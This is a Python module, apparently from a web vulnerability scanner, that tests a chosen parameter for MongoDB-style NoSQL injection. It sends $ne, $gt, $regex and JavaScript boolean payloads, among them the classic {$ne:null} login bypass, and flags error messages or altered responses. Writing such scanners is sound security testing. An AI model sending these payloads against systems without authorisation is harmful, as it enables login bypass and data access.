"""nosqli — NoSQL injection (MongoDB-style operator & auth-bypass probes)."""
import re
from common import Finding

NAME = "nosqli"

ERROR_MARKERS = re.compile(
    r"(MongoError|MongoServerError|CastError|BSONError|unexpected token|"
    r"\$where|failed to parse)", re.IGNORECASE)


def _sim(a, b):
    if not a and not b:
        return 1.0
    m = max(len(a), len(b))
    return (min(len(a), len(b)) / m) if m else 1.0


def run(client, opts):
    param = opts.get("param")
    if not param:
        return [Finding(NAME, "info", "NoSQL-injection check skipped", "no --param provided")]
    method = opts.get("method", "GET").upper()
    base = str(opts.get("base_value", "1"))
    out = []

    baseline = (client.request("GET", params={param: base}) if method == "GET"
                else client.request("POST", json={param: base}))

    if method == "GET":
        # operator injection via param[$ne]=... style
        probes = [
            ({f"{param}[$ne]": base}, "operator $ne injection"),
            ({f"{param}[$gt]": ""}, "operator $gt injection"),
            ({f"{param}[$regex]": ".*"}, "operator $regex injection"),
            ({param: base + "' || '1'=='1"}, "JS boolean injection"),
        ]
        for params, why in probes:
            r = client.request("GET", params=params)
            if ERROR_MARKERS.search(r.body):
                out.append(Finding(NAME, "high", "NoSQL injection (error-based)",
                                   why, ERROR_MARKERS.search(r.body).group(0)))
                return out
            if _sim(r.body, baseline.body) < 0.85 and r.status < 500:
                out.append(Finding(NAME, "high", "Possible NoSQL injection (behavior change)",
                                   f"{why} altered response", f"sim={_sim(r.body, baseline.body):.2f}"))
                return out
    else:
        # JSON body operator injection (classic Mongo auth bypass)
        for body, why in [({param: {"$ne": None}}, "{$ne:null} auth-bypass"),
                          ({param: {"$gt": ""}}, "{$gt:''} operator"),
                          ({param: {"$regex": ".*"}}, "{$regex:'.*'} operator")]:
            r = client.request("POST", json=body)
            if ERROR_MARKERS.search(r.body):
                out.append(Finding(NAME, "high", "NoSQL injection (error-based)",
                                   why, ERROR_MARKERS.search(r.body).group(0)))
                return out
            if _sim(r.body, baseline.body) < 0.85 and r.status < 500:
                out.append(Finding(NAME, "high", "Possible NoSQL injection (behavior change)",
                                   f"{why} altered response", f"sim={_sim(r.body, baseline.body):.2f}"))
                return out
    return out
